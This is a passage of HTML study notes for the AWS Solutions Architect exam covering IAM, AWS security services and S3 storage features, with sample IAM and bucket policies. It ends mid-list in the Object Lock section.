<h2 id="user-permissions"><a class="header" href="#user-permissions">User Permissions</a></h2>
<ul>
<li>Permission Boundaries can be set for a user account. They control the maximum permissions for the user. This can be helpful to delegate permission management to other users.</li>
<li>Permissions can be defined on a user account using a built-in policy or by adding the user to a group with defined permissions</li>
<li>You can create an access key for a user that can be used to access AWS APIs via the CLI, an Application, third party service, etc.</li>
<li>Permission policies are defined in JSON documents known as IAM policies:
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [
          {
              "Action": "ec2:*",
              "Resource": "*",
              "Effect": "Allow",
              "Condition": {
                  "StringEquals": {
                      "ec2:Region": "us-east-2"
                  }
              }
          }
      ]
  }
</code></pre>
</li>
<li>Modifying custom IAM policies creates a new version of that policy</li>
</ul>
<h1 id="password-policy-1"><a class="header" href="#password-policy-1">Password Policy</a></h1>
<ul>
<li>You can define a password policy in IAM</li>
<li>Typical password policy settings</li>
</ul>
<h1 id="mfa"><a class="header" href="#mfa">MFA</a></h1>
<ul>
<li>MFA Device Options
<ul>
<li>Virtual MFA Device
<ul>
<li>Google Authenticator</li>
<li>Authy</li>
</ul>
</li>
<li>Universal 2nd Factor (U2F) Security Key
<ul>
<li>Yubikey</li>
</ul>
</li>
<li>Hardware Key Fob
<ul>
<li>Provided By Gemalto (3rd party)</li>
</ul>
</li>
<li>Hardware Device for AWS GovCloud
<ul>
<li>Provided by SurePassID</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="roles"><a class="header" href="#roles">Roles</a></h1>
<ul>
<li>Used to provide access to AWS services</li>
<li>For example, provide an EC2 instance access to an S3 bucket</li>
</ul>
<h1 id="security-tools-in-iam"><a class="header" href="#security-tools-in-iam">Security Tools in IAM</a></h1>
<ul>
<li>Credential Report: Generates a CSV file contains details about user accounts</li>
<li>Security Access Advisor: Accessible from an individual account in IAM. Shows what AWS services the AWS account is accessing.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-certificate-manager"><a class="header" href="#aws-certificate-manager">AWS Certificate Manager</a></h1>
<ul>
<li>Integration with API Gateway
<ul>
<li>Create a custom domain name in API Gateway</li>
<li>For edge optimized API Gateways, The TLS certificate must be in the same region as CloudFront</li>
<li>For regional API Gateways, The TLS certificate must be imported on API gateway, in the same region as the API Gateway</li>
</ul>
</li>
</ul>
<h1 id="aws-waf-web-application-firewall"><a class="header" href="#aws-waf-web-application-firewall">AWS WAF (Web Application Firewall)</a></h1>
<ul>
<li>Protection at Layer 7 of the OSI Model</li>
<li>Can be deployed on ALB, CloudFront, API Gateway, AppSync GraphQL API, Cognito User Pool</li>
<li>After deploying the firewall, you create a Web ACL rule:
<ul>
<li>Filter based on IP address, HTTP Headers, HTTP body, URI strings, Message Size, geo-match, and rate-based rules</li>
<li>Web ACL‚Äôs are regional. Except for in CloudFront where they are global</li>
</ul>
</li>
<li>How can we get a fixed IP while using WAF with ALB? Use a Global Accelerator in front of the ALB. The Global Accelerator will provide the static IP address, since an ALB cannot have a static IP.</li>
</ul>
<h1 id="aws-shield"><a class="header" href="#aws-shield">AWS Shield</a></h1>
<ul>
<li>Protect from DDoS attacks</li>
<li>Standard and Advanced SKUs
<ul>
<li>Standard is free and included/enabled on all VPCs</li>
<li>Advanced is $3000/month per organization. Protection from more sophisticated DDoS attacks on EC2, ELB, CloudFront, Global Accelerator, and Route 53. Advanced also included 24/7 access to the DDoS Response Team. Shield Advanced will automatically create WAF rules for you.</li>
</ul>
</li>
</ul>
<h1 id="aws-firewall-manager"><a class="header" href="#aws-firewall-manager">AWS Firewall Manager</a></h1>
<ul>
<li>Manage rules for multiple firewalls in an AWS organization</li>
<li>Can be used with WAF</li>
<li>Policies are created at the regional level</li>
<li>Rules are applied to new resources when they are created automatically</li>
</ul>
<h1 id="guardduty"><a class="header" href="#guardduty">GuardDuty</a></h1>
<ul>
<li>Use ML to protect your AWS account</li>
<li>Uses CloudTrail Event Logs, VPC Flow logs, and DNS Logs. Optional EKS audit logs, RDS and Aurora logs, EBS, Lambda, and S3 data events</li>
<li>Can setup EventBridge rules to be notified in case of findings.</li>
<li>Can protect against Crypto Currency attacks</li>
</ul>
<h1 id="inspector"><a class="header" href="#inspector">Inspector</a></h1>
<ul>
<li>Automated security assessments on EC2 instances. Use AWS SSM Agent to scan the instance</li>
<li>Automated scans of container images pushed to ACR for CVEs</li>
<li>Lambda Functions can be scanned for vulnerabilities in code and package dependencies</li>
<li>Report findings in Security Hub or send findings via EventBridge</li>
</ul>
<h1 id="macie"><a class="header" href="#macie">Macie</a></h1>
<ul>
<li>Use ML and pattern matching to discover and protect sensitive data in AWS in S3</li>
<li>Notify you through EventBridge when PII is found</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="storage-cheatsheet"><a href="#storage-cheatsheet" class="header">Storage-cheatsheet</a></h1>
<ul>
<li><b>Simple Storage Service (S3) </b> Object-based storage. Store unlimited amount of data without worry of underlying storage infrastructure</li>
<li>S3 replicates data across at least <ins>  3 AZs to ensure 99.99% Availability </ins> and 11‚Äô9s of durability</li>
<li>Objects contain data (they‚Äôre like files)</li>
<li>
<ul>
<li>Objects can be size anywhere from <b> <ins> 0 Bytes up to 5 Terabytes </ins></b></li>
</ul>
</li>
<li>Buckets contain objects. Buckets can also contain folders which can in turn can contain objects</li>
<li>Bucket names are unique across all AWS accounts. Like a domain name</li>
<li>When you upload a file to S3 successfully you‚Äôll receive a HTTP 200 code . <b> Lifecycle Management </b> Objects can be moved between storage classes or objects can be deleted automatically based on schedule</li>
<li><b> Versioning </b> Objects are given a Version ID. When new objects are uploaded the old objects are kept. You can access any object version. When you delete an object the previous object is restored. Once Versioning is turned on it cannot be turned off, only suspended.</li>
<li><b> MFA DELETE </b> enforce DELETE operations to require MFA token in order to delete an object. Must have verioning turned on to use. Can only turn on MFA delete from the AWS CLI. Root Account is only allowed to delete objects</li>
<li>All new buckets are <b> private by default </b>
Logging can be turned to on a bucket to log to track operations performed on objects</li>
<li><b> Access Control </b> is configured using <b> Bucket Policies </b> and <b> Access Control Lists (ACL) </b></li>
<li><b> Bucket Policies </b> are JSON documents which let you write complex control access</li>
<li><b> ACLs </b> are the legacy method (not depracated) where you grant access to objects and buckets with simple actions</li>
<li><b> Security in Transit </b> Uploading is done over SSL</li>
<li><b> SSE </b> stands for <ins> Server Side Encryption </ins>, S3 has 3 options for SSE</li>
<li><b> SSE-AES </b> S3 handles the key, uses AES-256 algorithm</li>
<li><b> SSE-KMS </b> Envelope encryption via AWS KMS and you manage the keys</li>
<li><b>SSE-C </b> Customer provided key (you manage the key)</li>
<li><b> Client Side Encryption </b>You must encrypt your own files before uploading them to S3</li>
<li><b> Cross Region Replication (CRR) </b> allows you to replicate files across regions for greater durability.You  must have versioning turned on in the source and destination bucket. You can have CRR replicate to bucket in another AWS account</li>
<li><b> Transfer Acceleration </b> Provide faster and secure uploads from anywhere in the world. Data is uploaded via distinct url to an Edge location. Data is then transported to your S3 bucket via AWS backbone network.</li>
<li><b> Presigned Urls </b> is a URL generated via the AWS CLI and SDK. It provides temporary access to write or download object data. Presigned URLs are commonly used to access private objects.</li>
<li>S3 has <b> 6 different storage classes </b>
<ul>
<li><b> Standard </b> Fast 99.99% Availability, 11 9‚Äôs Durability. Replicated across at least three AZs</li>
<li><b> Intelligent Tiering </b> Uses ML to analyze your object usage and determine the appropriate storage class. Data is moved to the most cost-effective access tier, without any performance impact or added overhead.</li>
<li><b> Standard Infrequently Accessed (IA) </b>n Still fast! Cheaper if you access files less than once a month. Additional retrieval fee is applied. 50 % less than Standard (reduced availability )</li>
<li><b> One Zone IA </b> Still fast! Objects only exist in one AZ. Availability (is 99.5%). but cheaper then standard IA by 20% less (Reduce durability ) Data could get destroyed. A retrieval fee is applied.</li>
<li><b> Glacier </b> For long term cold storage. Retrieval of data can take minutes to hours but the off is very cheap storage</li>
<li><b> Glacier Deep Archive </b> The lowest cost storage class. Data retrieval time is 12 hours</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="introduction-to-s3-1"><a href="#introduction-to-s3-1" class="header">Introduction to S3</a></h1>
<ul>
<li><a href="#introduction-to-s3">Introduction to S3</a></li>
<li><a href="#s3-storage-classes-1">S3 Storage Classes</a></li>
<li><a href="#storage-class-comparison">Storage class comparison</a></li>
<li><a href="#s3-security-1">S3 Security</a></li>
<li><a href="#s3-encryption-1">S3 Encryption</a></li>
<li><a href="#s3-objects">S3 Objects</a></li>
<li><a href="#s3-data-consistency">S3 Data Consistency</a></li>
<li><a href="#s3-cross-region-replication">S3 Cross-Region Replication</a></li>
<li><a href="#s3-versioning-1">S3 Versioning</a></li>
<li><a href="#lifecycle-management">Lifecycle Management</a></li>
<li><a href="clouds/aws/saa-c03/Storage/s3-transfer-acceleration">S3 Transfer Acceleration</a></li>
<li><a href="#presigned-urls-1">Presigned URLs</a></li>
<li><a href="#mfa-delete-1">MFA Delete</a></li>
<li><a href="#aws-snow-family">AWS Snow Family</a></li>
<li><a href="#storage-services">Storage Services</a></li>
<li><a href="#storage-gateway-1">Storage Gateway</a></li>
<li><a href="#amazon-fsx-vs-efs">Amazon FSx vs EFS</a></li>
<li><a href="#s3-object-lock">S3 Object Lock</a>
<ul>
<li><a href="#governance-mode">Governance mode</a></li>
<li><a href="#compliance-mode">Compliance mode</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="introduction-to-s3"><a class="header" href="#introduction-to-s3">Introduction to S3</a></h2>
<hr>
<ul>
<li><b> What is Object Storage (Object-based storage)? </b></li>
<li>data storage architecture that manages data as objects, as opposed to other storage architectures:
<ul>
<li>file systems: which manages data as files and fire hierarchy</li>
<li>block storage- which manages data as blocks within sectors and tracks
<ul>
<li>S3 provides with <ins> Unlimited storage </ins></li>
<li>Need not think about underlying infrastructure</li>
<li>S3 console provides an interface for you to upload and access your data</li>
<li>Individual <ins> Object </ins> can be store form <ins> 0 Bytes to 5 Terabytes </ins> in size</li>
<li>Files larger than 5GB must be uploaded using multi-part upload. It‚Äôs recommended to use multi-part upload for files larger than 100MB</li>
</ul>
</li>
</ul>
</li>
<li>Baseline Performance
<ul>
<li>3500 PUT/COPY/POST/DELETE or 5500 GET/HEAD requests per seconds per prefix in a bucket</li>
<li>There are no limits to the number of prefixes in a bucket</li>
<li>Example of a prefix
<ul>
<li>bucket/folder1/subfolder1/mypic.jpg =&gt; prefix is /folder1/subfolder1/</li>
</ul>
</li>
</ul>
</li>
<li>S3 Select
<ul>
<li>Use SQL like language to only retrieve the data you need from S3 using server-side filtering</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th><strong>S3 Object</strong></th><th><strong>S3 Bucket</strong></th></tr>
</thead>
<tbody>
<tr><td>- Obejcts contain data(files)</td><td>- Buckets hold objects</td></tr>
<tr><td>- They are like files</td><td>- Buckets can have folders which can turn in hold objects</td></tr>
<tr><td>Object may consists of:  - <b> Key </b> this is the name of the object  - <b> Value </b> data itself is made up of sequence of bytes <br>- <b> Version Id </b> version of object (when versioning is enabled) <br> - <b> Metadata </b> additional information attached to the object</td><td>- S3 is universal namespace so domain names must be <ins> Unique </ins> (like having a domain name)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="s3-storage-classes-1"><a class="header" href="#s3-storage-classes-1">S3 Storage Classes</a></h2>
<hr>
<ul>
<li>AWS offers a range of S3 Storage classes that<ins> trade Retrieval, Time, Accessability and Durability for Cheaper Storage </ins></li>
</ul>
<h3 id="descending-from-expensive-to-cheaper-1"><a class="header" href="#descending-from-expensive-to-cheaper-1">(Descending from expensive to cheaper)</a></h3>
<div style="display:flex;">
<img src="clouds/aws/saa-c03/images/S3/cheaper.png" width="15%" height="500" float="right" />
<p float="right">
<ul>
<li>
<p><b> S3 Standard (default) </b></p>
<ul>
<li>Fast! 99.99 % Availability,</li>
<li>11 9‚Äôs Durability. If you store 10,000,000 objects on S3, you can expect to lose a single object once every 10,000 years</li>
<li>Replicated across at least three AZs
<ul>
<li>S3 standard can sustain 2 concurrent facility failures</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> S3 Intelligent Tiering </b></p>
<ul>
<li>Uses ML to analyze object usage and determine the appropriate storage class</li>
<li>Data is moved to most cost-effective tier without any performance impact or added overhead</li>
</ul>
</li>
<li>
<p><b> S3 Standard-IA (Infrequent Access) </b></p>
<ul>
<li>Still Fast! Cheaper if you access files less than once a month</li>
<li><ins> Additional retrieval fee is applied</ins>. 50% less than standard (reduced availability)</li>
<li>99.9% Availability</li>
</ul>
</li>
<li>
<p><b> S3 One-Zone-IA </b></p>
<ul>
<li>Still fast! Objects only exist in one AZ.</li>
<li>Availability (is 99.5%). but cheaper than Standard IA by 20% less</li>
<li>reduces durability</li>
<li>Data could be destroyed</li>
<li>Retrieval fee is applied</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Instant Retrieval</b></p>
<ul>
<li>Millisecond retrieval, great for data accessed once a quarter</li>
<li>Minimum storage duration of 90 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Flexible Retrieval</b></p>
<ul>
<li>data retrieval: Expedited (1 to 5 minutes), Standard (3 to 5 hours), Bulk (5 to 12 hours) - free</li>
<li>minimum storage duration is 90 days</li>
<li>Retrieval of data can take minutes to hours but the off is <ins> very cheap storage </ins></li>
</ul>
</li>
<li>
<p><b> S3 Glacier Deep Archive</b></p>
<ul>
<li>The lowest cost storage class - Data retrieval time is 12 hours</li>
<li>standard (12 hours), bulk (48 hours)</li>
<li>Minimum storage duration is 180 days</li>
</ul>
</li>
<li>
<p><b> S3 Glacier Intelligent Tiering</b></p>
</li>
</ul>
</p>

</div>

<hr>
<h2 id="storage-class-comparison"><a class="header" href="#storage-class-comparison">Storage class comparison</a></h2>
<hr><img src="clouds/aws/saa-c03/images/S3/storage-class-comparison.jpg" width="70%" height="70%" />
<ul>
<li>S3 Guarantees:
<ul>
<li>Platform is built for 99.99% availability</li>
<li>Amazon guarantee 99.99% availability</li>
<li>Amazon guarantees 11‚Äô9s of durability</li>
</ul>
</li>
</ul>
<hr>
<h2 id="s3-security-1"><a class="header" href="#s3-security-1">S3 Security</a></h2>
<hr>
<ul>
<li>
<p>All new buckets are <b> PRIVATE</b> when created by default</p>
</li>
<li>
<p>Logging per request can be turned on a bucket</p>
</li>
<li>
<p>Log files are generated and saved in a different bucket (can be stored in a bucket from different AWS account if desired)</p>
</li>
<li>
<p>Access control is configured using <b> Bucket Policies </b> and <b> Access Control Lists (ACL) </b></p>
</li>
<li>
<p>User-Based Security</p>
<ul>
<li>IAM Policies</li>
<li>An IAM principal can access an s3 object if the user IAM permissions allow it OR the resource policy allows it and there is no explicit deny</li>
</ul>
</li>
<li>
<p>Resource-Based Security</p>
<ul>
<li>
<p>Bucket Policies - Bucket wide rules from the S3 console</p>
<ul>
<li>
<p>JSON based policy</p>
<pre><code>  {
      "Version": "2012-10-17",
      "Statement": [{
          "Sid": "AllowGetObject",
          "Principal": {
              "AWS": "*"
          },
          "Effect": "Allow",
          "Action": "s3:GetObject",
          "Resource": "arn:aws:s3:::DOC-EXAMPLE-BUCKET/*",
          "Condition": {
              "StringEquals": {
                  "aws:PrincipalOrgID": ["o-aa111bb222"]
              }
          }
      }]
  }
</code></pre>
</li>
<li>
<p>You can use the AWS Policy Generator to create JSON policies</p>
</li>
</ul>
</li>
<li>
<p>Object ACL - finer grained</p>
</li>
<li>
<p>Bucket ACL - Less common</p>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="s3-static-website-hosting-1"><a class="header" href="#s3-static-website-hosting-1">S3 Static Website Hosting</a></h2>
<ul>
<li>You must enable public reads on the bucket</li>
</ul>
<h2 id="s3-encryption-1"><a class="header" href="#s3-encryption-1">S3 Encryption</a></h2>
<ul>
<li>
<p>4 types of encryption in S3</p>
<ul>
<li>
<p>Server side encryption with managed keys (SSE-S3)</p>
<ul>
<li>Key is completely managed by AWS, you never see it</li>
<li>Object is encrypted server-side</li>
<li>Enabled by default
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AES256"</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Server side encryption with KMS keys stored in AWS KMS (SSE-KMS)</p>
<ul>
<li>Manage the key yourself, store the key in KMS</li>
<li>You can audit the key use in CloudTrail
<ul>
<li>Uses AES-256, must set header <code>"x-amz-server-side-encryption": "AWS:KMS"</code></li>
</ul>
</li>
<li>Accessing the key counts toward your KMS Requests quota (5500, 10000, 30000 rps, based on region)
<ul>
<li>You can request a quota increase from AWS</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Server Side Encryption with customer provided keys (SSE-C)</p>
<ul>
<li>Can only be enabled/disabled from the AWS CLI</li>
<li>AWS doesn‚Äôt store the encryption key you provide</li>
<li>The ky must be passed as part of the headers with every request you make</li>
<li>HTTPS must be used</li>
</ul>
</li>
<li>
<p>CSE (Client side encryption)</p>
<ul>
<li>Clients encrypt/decrypt all the data before sending any data to S3</li>
<li>Customer fully managed the keys and encryption lifecycle</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Encryption in Transit</p>
<ul>
<li>Traffic between local host and S3 is achieved via <b> SSL/TLS</b></li>
</ul>
</li>
</ul>
<h2 id="s3-objects"><a class="header" href="#s3-objects">S3 Objects</a></h2>
<img src="clouds/aws/saa-c03/images/S3/s3-objects.jpg" width="50%" />
<h2 id="s3-data-consistency"><a class="header" href="#s3-data-consistency">S3 Data Consistency</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>New Object (PUTS)</th><th>Overwrite (PUTS) or Delete Objects (DELETES)</th></tr>
</thead>
<tbody>
<tr><td>Read After Write Consistency</td><td>Eventual Consistency</td></tr>
<tr><td>When you upload a new S3 Object you are able to read immediately after writing</td><td>When you overwrite or delete an object it takes time for S3 to replicate versions to AZs</td></tr>
<tr><td></td><td>If you were to read immediately, S3 may return you an old copy. You need to generally wait a few seconds before reading</td></tr>
</tbody>
</table>
</div>
<h2 id="s3-cross-region-replication-or-same-region-replication-1"><a class="header" href="#s3-cross-region-replication-or-same-region-replication-1">S3 Cross-Region Replication or Same-Region Replication</a></h2>
<ul>
<li>
<p>When enabled, any object that is uploaded will be <b> Automatically replicate </b> to another region or from source to destination buckets</p>
  <img src="clouds/aws/saa-c03/images/S3/cross-region-replication.jpg" width="40%" height="70%" />
</li>
<li>
<p>Must have versioning turned on both the source and destination buckets.</p>
</li>
<li>
<p>Can have CRR replicate to another AWS account</p>
</li>
<li>
<p>Replicate objects within the same region</p>
</li>
<li>
<p>You must give proper IAM permissions to S3</p>
</li>
<li>
<p>Buckets can be in different AWS accounts</p>
</li>
<li>
<p>Only new objects are replicated after enabling replication. To replicate existing objects, you must use S3 Batch Replication</p>
</li>
<li>
<p>For DELETE operations, you can optionally replicate delete markers. Delete Markers are not replicated by default.</p>
</li>
<li>
<p>To replicate, you create a replication rule in the ‚ÄúManagement‚Äù tab of the S3 bucket. You can choose to replicate all objects in the bucket, or create a rule scope</p>
</li>
</ul>
<h2 id="s3-versioning-1"><a class="header" href="#s3-versioning-1">S3 Versioning</a></h2>
<ul>
<li>
<p>allows to version the object</p>
</li>
<li>
<p>Stores all versions of an object in S3</p>
</li>
<li>
<div style="display:flex;"> Once enabled it cannot be disabled, only suspended on the bucket
<p><img src="clouds/aws/saa-c03/images/S3/versioning-enable-feature.jpg" width="30%" height="70%" float="right" /> </p>
</div>
</li>
<li>
<p>Fully integrates with S3 Lifecycle rules</p>
</li>
<li>
<p>MFA Delete feature provides extra protection against deletion of your data</p>
  <img src="clouds/aws/saa-c03/images/S3/versioning.jpg" width="50%" />
</li>
</ul>
<h2 id="lifecycle-management"><a class="header" href="#lifecycle-management">Lifecycle Management</a></h2>
<ul>
<li>
<p>Lifecycle Rule Actions</p>
<ul>
<li>Move current objects between storage classes</li>
<li>Move noncurrent versions of objects between storage classes</li>
<li>Expire current versions of objects</li>
<li>Permanently delete noncurrent versions of objects</li>
<li>Delete Expired object delete markers or incomplete multi-part uploads</li>
</ul>
</li>
<li>
<p>Automates the process of moving objects to different Storage classes or deleting objects all together</p>
</li>
<li>
<p>Can be used together with <b> Versioning </b></p>
</li>
<li>
<p>Can be applied to both <b> Current </b> and <b> previous </b> versions</p>
  <img src="clouds/aws/saa-c03/images/S3/s3-lifecycle-management.jpg " width="50%" />
</li>
</ul>
<h2 id="s3-transfer-acceleration"><a class="header" href="#s3-transfer-acceleration">S3 Transfer Acceleration</a></h2>
<ul>
<li>
<p>Fast and secure transfer of files<b> over long distances </b> between your end users and an S3 bucket</p>
</li>
<li>
<p>Utilizes <b> <ins> CloudFront‚Äôs </ins></b> distributed <b><ins> Edge locations </ins></b></p>
</li>
<li>
<p>Instead of uploading to your bucket, users use a <i><ins> distinct URL </ins></i> for an Edge location</p>
</li>
<li>
<p>As data arrives at the Edge location it is automatically routed to S3 over a specially optimized network path. (Amazon‚Äôs backbone network)</p>
</li>
<li>
<p>Transfer acceleration is fully compatible with multi-part upload</p>
  <img src="clouds/aws/saa-c03/images/S3/transfer-acceleration.jpg" width="50%" />
</li>
</ul>
<h2 id="presigned-urls-1"><a class="header" href="#presigned-urls-1">Presigned URLs</a></h2>
<ul>
<li>
<p>Generates a URL which provides temporary access to an object to either upload or download object data.</p>
</li>
<li>
<p>The pre-signed URL inherites the permission of the user that created the pre-signed URL</p>
</li>
<li>
<p>Presigned Urls are commonly used to <ins> provide access to <b> private objects </b></ins></p>
</li>
<li>
<p>Can use AWS CLI or AWS SDK to generate Presigned Urls</p>
  <img src="clouds/aws/saa-c03/images/S3/presigned-urls.jpg" width="50%" height="30%" />
</li>
<li>
<p>If in case a web-application which need to allow users to download files from a password protected part of the web-app. Then the web-app generates presigned url which expires after 5 seconds. The user downloads the file.</p>
</li>
</ul>
<h2 id="mfa-delete-1"><a class="header" href="#mfa-delete-1">MFA Delete</a></h2>
<ul>
<li>
<p><b> MFA Delete</b> ensures users cannot delete objects from a bucket unless they provide their MFA code.</p>
  <img src="clouds/aws/saa-c03/images/S3/mfa-delete.jpg" width="50%" height="30%" />
</li>
<li>
<p>MFA delete can only be enabled under these conditions</p>
<ol>
<li>The AWS CLI must be used to turn on MFA</li>
<li>The bucket must have versioning turned on</li>
</ol>
  <img src="clouds/aws/saa-c03/images/S3/mfa-delete-log.jpg" width="50%" height="30%" />
</li>
<li>
<p>Only the bucket owner logged in as <ins><b> Root User</b></ins> can <b> DELETE</b> objects from bucket</p>
</li>
</ul>
<h2 id="aws-snow-family"><a class="header" href="#aws-snow-family">AWS Snow Family</a></h2>
<ul>
<li>AWS Snow Family are <ins> Storage and compute devices used to physically move data in or out the cloud </ins> when moving data over the internet or private connection it to slow, difficult or costly</li>
<li>Data Migration: Snowcone, Snowball Edge (Storage Optimized), Snowmobile</li>
<li>Edge computing: Snowcone, Snowball Edge (Compute Optimized)</li>
<li>Snowcone
<ul>
<li>Small, weighs 4 pounds</li>
<li>Rugged</li>
<li>Must provide your own battery and cables</li>
<li>Snowcone 8TB</li>
<li>Snowcone 14TB SSD</li>
</ul>
</li>
</ul>
<p><img src="clouds/aws/saa-c03/images/S3/snow_family.png" alt="Snow family"></p>
<h2 id="storage-services"><a class="header" href="#storage-services">Storage Services</a></h2>
<ul>
<li>
<p><b> Simple Storage Service (S3)</b></p>
<ul>
<li>A <ins> serverless object storage service </ins> is created</li>
<li>can upload very large files and unlimited amount of files</li>
<li>you pay for what you store</li>
<li>Need not worry about the underlying file-system or upgrading the disk size</li>
</ul>
</li>
<li>
<p><b> S3 Glacier </b></p>
<ul>
<li>Cold storage service</li>
<li><ins> low cost storage solution </ins> for <i> archiving and long-term backup </i></li>
<li>Uses previous generation HDD drives to get that low cost</li>
<li>highly secure and durable</li>
</ul>
</li>
<li>
<p><b> Elastic Block Store (EBS) </b></p>
<ul>
<li><ins> a persistent block storage service </ins></li>
<li>virtual hard drive in the cloud to attach to EC2 instances</li>
<li>can choose different kinds of storage: SSD, IOPS, SSD, Throughput HHD, Cold HHD</li>
</ul>
</li>
<li>
<p><b> Elastic File Storage (EFS) </b></p>
<ul>
<li><ins> a cloud-native NFS file system service </ins></li>
<li>File storage you can mount to <ins> multiple Ec2 instances at the same time</ins></li>
<li>When you need to share files between multiple EC2 instances</li>
</ul>
</li>
<li>
<p><b> Storage Gateway </b></p>
<ul>
<li><ins> a hybrid cloud storage </ins> service that extends your on-premise storage to cloud
<ul>
<li><b> File Gateway </b> : extends your local storage to AWS S3</li>
<li><b> Volume Gateway </b> : caches your local drives to S3 so you have continuous backup of files on cloud</li>
<li><b> Tape Gateway </b> : stores files on virtual tapes for very cost effective and long term storage</li>
</ul>
</li>
</ul>
</li>
<li>
<p><b> AWS Snow Family </b></p>
<ul>
<li>Storage devices used to physically migrate large amounts of data</li>
<li><b> Snowball and Snowball Edge </b> {Snowball does not exist anymore} briefcase size of data storage devices. 50-80 Terabytes</li>
<li><b> Snowmobile </b> Cargo container filled with racks of storage and compute that is transported via semi-trailer tractor truck to transfer upto 100PB of data per trailer</li>
<li><b> Snowcone </b> very small version of snowball that can transfer 8TB of data</li>
</ul>
</li>
<li>
<p><b> AWS Backup </b></p>
<ul>
<li>a <ins> fully managed backup service </ins></li>
<li>centralize and automate the backup of the backup data across multiple AWS services</li>
<li>eg. EC2, EBS, RDS, DynamoDB, EFS, Storage Gateway</li>
<li>can create backup plans</li>
</ul>
</li>
<li>
<p><b> Cloud Endure Disaster Recovery </b></p>
<ul>
<li>Continuously replicates your machines into low cost staging area in your target AWS account and preferred region enabling fast and reliable recovery if one of the data center fails</li>
</ul>
</li>
<li>
<p><b> Amazon FSx </b></p>
</li>
<li>
<p>Launch 3rd party high performance file systems on AWS</p>
</li>
<li>
<p>Fully managed service</p>
</li>
<li>
<p>Supports Lustre, OpenZFS, NetApp ONTAP, and Windows File Server (SMB)</p>
</li>
<li>
<p>Data is backed up daily</p>
</li>
<li>
<p><b>Windows FSx can be mounted on Linux Servers</b></p>
</li>
<li>
<p>Lustre is derived from Linux and Cluster and used for high-performance computing</p>
</li>
<li>
<p>FSx can be used for on-prem servers using Direct Connect or VPN</p>
</li>
<li>
<p>FSx for Lustre deployment options:</p>
<ul>
<li>Scratch file system
<ul>
<li>Temporary storage, data is not replicated, high performance</li>
</ul>
</li>
<li>Persistent File System
<ul>
<li>Long term storage, data is replicated within same AZ (files replaced within minutes upon failure)</li>
</ul>
</li>
</ul>
</li>
<li>
<p>FSx for NetApp ONTAP is compatible with NFS, SMB, iSCSI. Supports point-in-time instantaneous cloning</p>
</li>
<li>
<p><b> Amazon Athena </b></p>
<ul>
<li>A serverless, interactive analytics service built on open-source frameworks, <ins> <b>supporting open-table and file formats.</b></ins></li>
<li>Athena provides simplified flexible way to analyze petabytes of data where it lives</li>
<li>Analyze data or build applications from an S3 data lake and 30 data sources, including on-premises data sources or other cloud systems using SQL or Python</li>
</ul>
</li>
</ul>
<h2 id="storage-gateway-1"><a class="header" href="#storage-gateway-1">Storage Gateway</a></h2>
<ul>
<li>
<p>Bridge between on-prem and S3 storage</p>
</li>
<li>
<p>Can run as a virtual or hardware appliance on-prem</p>
</li>
<li>
<p>Use Cases:</p>
<ol>
<li>disaster recovery</li>
<li>backup and restore/cloud migration</li>
<li>tiered storage</li>
<li>on-premises cache and low-latency file access</li>
</ol>
</li>
<li>
<p>S3 File Gateway</p>
<ul>
<li>S3 buckets are accessible using the NFS and SMB protocol</li>
<li>Most recently used data is cached in the file gateway</li>
<li>Supports S3 standard, S3 Standard IA, S3 One ZOne A, S3 Intelligent Tiering</li>
<li>Transition to S3 Glacier using a Lifecycle Policy</li>
</ul>
</li>
<li>
<p>FSx File Gateway</p>
<ul>
<li>Native access to Amazon FSx for Windows File Server</li>
<li>Useful for caching frequently accessed data on your local network</li>
<li>Windows native compatibility</li>
</ul>
</li>
<li>
<p>Volume Gateway</p>
<ul>
<li>Block storage using iSCSI backed by S3</li>
<li>Point in time backups</li>
<li>Gives you the ability to restore on-prem volumes</li>
</ul>
</li>
<li>
<p>Tape Gateway</p>
<ul>
<li>Same as Volume Gateway, but for tapes</li>
</ul>
</li>
</ul>
<h2 id="amazon-fsx-vs-efs"><a class="header" href="#amazon-fsx-vs-efs">Amazon Fsx vs EFS</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>EFS</th><th>FSx</th></tr>
</thead>
<tbody>
<tr><td>EFS is a managed NAS filer for EC2 instances based on Network File System (NFS) version 4</td><td>FSx is a managed Windows Server that runs Windows Server Message Block (SMB) based files systems</td></tr>
<tr><td>File systems are distributed across availability zones (AZs) to eliminate I/O bottlenecks and improve data durability</td><td>Built for high performance and sub-millisecond latency using solid-state drive storage volumes</td></tr>
<tr><td>Better for Linux Systems</td><td>Applications:  - Web servers and content management systems built on windows and deeply integrated with windows server ecosystem</td></tr>
</tbody>
</table>
</div>
<h2 id="s3-object-lock"><a class="header" href="#s3-object-lock">S3 Object Lock</a></h2>
<ul>
<li>
<p>With S3 Object Lock, you can store objects using <ins> <b> write-once-read-many (WORM) </b> mode.</ins></p>
</li>
<li>
<p>Object lock can <ins> prevent from objects from being deleted or overwritten </ins> for a <i> fixed amount of time or indefinitely </i></p>
<h3 id="governance-mode"><a class="header" href="#governance-mode">Governance mode</a></h3>
<ul>
<li>Users can‚Äôt overwrite or delete an object version or alter its lock settings unless they have special permissions.</li>
<li>Protect objects against being deleted by most users, but you can still grant some users permission to alter the retention settings or delete the object if necessary.</li>
<li>Used to test retention-period settings before creating a compliance- mode retention period</li>
</ul>
<h3 id="compliance-mode"><a class="header" href="#compliance-mode">Compliance mode</a></h3>
<hr>
<ul>
<li>A protected object version can‚Äôt be overwritten or deleted by any user, including the root user</li>
